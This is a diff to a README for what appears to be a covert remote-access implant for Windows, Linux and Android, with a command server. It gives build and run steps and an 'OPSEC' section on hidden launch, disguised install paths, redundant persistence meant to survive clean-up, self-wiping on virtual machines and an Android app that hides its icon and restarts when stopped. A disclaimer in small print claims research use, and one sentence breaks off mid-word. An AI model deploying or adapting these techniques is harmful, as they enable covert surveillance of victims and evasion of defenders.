@@ -182,10 +182,38 @@ Paths:
 <details>
 <summary><b>Linux</b></summary>
 
+Requirements: Python 3.9+. Root on the server side is recommended so `reports/` and `loot/` are writable.
+
 **Server**
+
+1. Set `SERVER_ENCRYPTION_KEY_STR` in `server.py` to a 16-character key.
+2. Start it:
+
+```bash
+python3 server.py
+```
+
+It binds `[::]:3000`
 
 
 **Client**
+
+1. Set `BUILD`, `SERVER` and `KEYSTR` at the top of `client.sh`. `KEYSTR` must match the server key exactly.
+2. Run it:
+
+```bash
+chmod +x client.sh
+./client.sh
+```
+
+3. Confirm it is up:
+
+```bash
+./0net2.sh --status
+./0net2.sh --show
+```
+
+`--show` keeps it in the foreground with console output. `--kill` stops it, `--uninstall` strips persistence and removes every artefact.
 
 
 </details>
@@ -193,10 +221,31 @@ Paths:
 <details>
 <summary><b>Windows</b></summary>
 
+
+Requirements: Windows 10/11, Python 3.9+ The client runs under the logged-on user and needs no elevation.
+
 **Server**
 
+1. Set `SERVER_ENCRYPTION_KEY_STR` in `server.py` to a 16-character key.
+2. Start it:
+
+```powershell
+python server.py
+```
+
+It binds `127.0.0.1:3000`
 
 **Client**
+
+1. Set `$Server` and `$KeyStr` near the top of the `.bat`. `$KeyStr` must match the server key exactly.
+2. Run the `.bat`.
+
+It extracts the PowerShell payload to `%LOCALAPPDATA%\Microsoft\Diagnostics`, writes `launch.vbs`, installs persistence and starts hidden. Nothing appears on screen.
+
+**Notes**
+
+- `$VmBlock = $true` by default. On a hypervisor the implant reports in, wipes itself and stays dark. Delete `%LOCALAPPDATA%\Microsoft\Diagnostics\vm.block` to re-arm, or set it to `$false`.
+- Run `client.ps1 -Show` for a console window, `-Status`-style output via `-Test`, `-Kill` to stop, `-Uninstall` to strip persistence and artefacts.
 
 
 </details>
@@ -204,21 +253,165 @@ Paths:
 <details>
 <summary><b>Android</b></summary>
 
+Requirements: a Linux build host (the builder pulls Linux JDK and SDK archives), Python 3.9+, `unzip`, `tar`, and `adb`. The output is a release APK signed with a keystore the builder generates once at `~/.keys/onet-release.jks`.
+
+**Server**
+
+Use the Android server, not the Windows or Linux one — it speaks a different protocol.
+
+1. Set `ENCRYPTION_KEY` at the top of `server.py` to exactly 16 characters.
+2. Start it:
+
+```bash
+python3 server.py
+```
+
+It binds `0.0.0.0:3000`.
+
+**Client**
+
+1. Set `SERVER_URL` and `ENCRYPTION_KEY` at the top of `client.py`. The key must be exactly 16 characters and must match the server.
+2. Build:
+
+```bash
+python3 client.py
+```
+
+The builder installs JDK 17 and the Android SDK into `/jdk17` and `/android-sdk` on first run, then produces `appxyz*.apk`.
+
+**Notes**
+
+- First launch walks the permission prompts, asks for battery-optimisation exemption and exact-alarm access, then disables its own launcher entry, the app disappears from the drawer and the icon is transparent.
+- Background location is granted via a redirect to the app settings page on Android 11+, not a dialog. Grant it manually.
+- `remove` sends an uninstall intent, so the operator still has to tap through the confirmation.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </details>
-
----
 
 ## Detection & OPSEC
 
 
 
----
-
-## Repository layout
 
 
----
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Per-platform posture. The honest version: every plane has meaningful hardening and every plane leaks.
+
+<details>
+<summary><b>Windows</b></summary>
+
+**Anonymisation**
+- Starts through `wscript.exe //B //NoLogo` → PowerShell `-WindowStyle Hidden`. No console ever appears.
+- Payload sits in `%LOCALAPPDATA%\Microsoft\Diagnostics`, which reads as a Microsoft component rather than a tool directory.
+- User-Agent is a current Chrome-on-Win64 string; traffic rides the tunnel over TLS.
+
+**Anti-exploitation** (hard to take over or kill)
+- Named mutex `Local\RemoteDiagnosticsClient` enforces single instance; the incumbent kills stale siblings before re-arming.
+- Three independent persistence mechanisms; a fourth surviving copy is unlikely, so a partial clean-up restores on next logon.
+- Requires no elevation, so it survives UAC-restricted sessions.
+- `remove` strips Run key, task, shortcut, config, launcher and payload, then exits.
+
+**Anti-detection**
+- VM guard: SMBIOS, BIOS, baseboard, disk enumeration and guest-tool process checks. Any single hit burns the box and it never returns.
+- Command output is redirected to a temp file rather than a pipe, so a launched GUI app cannot stall the poll loop and trip a timeout-based detector.
+- Log truncates at 512 KB; delivered command IDs cap at 2000 in memory.
+
+</details>
+
+<details>
+<summary><b>Linux</b></summary>
+
+**Anonymisation**
+- Double-fork daemonise, `setsid`, stdio to `/dev/null`. No controlling terminal.
+- Runs as `python3 /…/client.py`, so it shows as an interpreter, not a named binary.
+- `launch.sh` reconstructs `DISPLAY`, `XAUTHORITY` and `WAYLAND_DISPLAY` so it can reach a desktop session from cron or systemd where those are absent.
+- Chrome-on-X11 User-Agent with a distro token; TLS to the tunnel.
+
+**Anti-exploitation**
+- `fcntl` exclusive lock with a 30-second retry loop. The holder is authoritative and a competing start loses instead of racing.
+- Three persistence mechanisms across systemd user units, XDG autostart and crontab.
+- Three AES backends with graceful degradation: `cryptography`, then `pycryptodome`, then pure Python. The implant still works on a box with no crypto packages.
+- Screenshot chain has nine external tools plus `xwd`/`convert` plus a raw `XGetImage` path, so it succeeds without any of them installed.
+- `remove` disables all three persistence mechanisms, deletes config, launcher, script and ID, then `rmtree`s the temp directory.
+
+**Anti-detection**
+- VM guard across DMI, CPUID hypervisor flag, kernel modules, virtio device nodes, SCSI strings, guest-tool processes and `/.dockerenv`.
+- Poll jitter up to 800 ms; exponential backoff to 60 s on failure.
+- Per-install `MID:` salt means cloned images do not collide on one ID.
+
+</details>
+
+<details>
+<summary><b>Android</b></summary>
+
+**Anonymisation**
+- Icon and label are transparent and empty; after first launch `MainActivity` disables itself and the app leaves the drawer entirely.
+- Notification channel is `IMPORTANCE_MIN`, `VISIBILITY_SECRET`, no sound, no vibration, no badge — collapsed under "silent" if noticed at all.
+- `okhttp/4.9.0` User-Agent.
+
+**Anti-exploitation**
+- Sticky foreground service, persisted `JobScheduler` every 15 minutes, `setAndAllowWhileIdle` alarm chain every 5 minutes, boot receivers for `BOOT_COMPLETED` and vendor quick-boot variants.
+- `onTaskRemoved` schedules an exact restart 1.5 s out, so swiping the task away does not stop it.
+- Four watchdogs restart the poll loop, the wake lock, the telemetry job and the shell independently.
+- Server fallback list survives a primary going dark.
+- `remove` fires an uninstall intent, clears prefs and files, disables every component and kills the process.
+
+**Anti-detection**
+- Battery-optimisation exemption and exact-alarm access are requested up front so doze does not silently starve the poll.
+- No VM guard — an emulator is treated as a real device.
+
+</details>
+
+### Summary
+
+| | Windows | Linux | Android |
+|---|---|---|---|
+| Hides from user | yes | partial | yes |
+| VM guard | yes | yes | no |
+| Persistence layers | 3 | 3 | 5 |
+| Per-device secret | yes | yes | no |
+| Replay defence | nonce | nonce | timestamp only |
+| Self-destruct | yes | yes | yes |
+
+> **Operational responsibility.** Compromise of the server, leakage of a fleet key or an enrolled sec (Dont be lazy!!!)
+
 
 ## Legal
+
+<span style="font-size:0.5em;">
+Provided as-is for research and authorised security testing. Deploy only on systems you own or have written permission to test. No warranty; the operator is responsible for authorisation and for anything the framework does on a host. Not a substitute for a formal pentest engagement.</span>
+
 
